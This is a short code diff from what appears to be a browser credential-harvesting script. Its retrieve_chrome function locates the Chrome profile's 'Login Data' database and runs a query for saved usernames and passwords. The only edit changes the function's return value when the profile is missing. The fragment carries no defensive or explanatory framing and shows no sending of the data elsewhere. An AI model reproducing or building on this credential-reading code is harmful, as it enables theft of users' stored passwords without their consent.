@@ -6,7 +6,7 @@ def retrieve_chrome():
     datapath = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
     dbfile = os.path.join(datapath, 'Login Data')
     if not os.path.exists(datapath):
-        return None
+        return (None, None)
     db = sqlite3.connect(dbfile)
     dbcursor = db.cursor()
     selectPass = "SELECT username_value, password_value FROM logins"
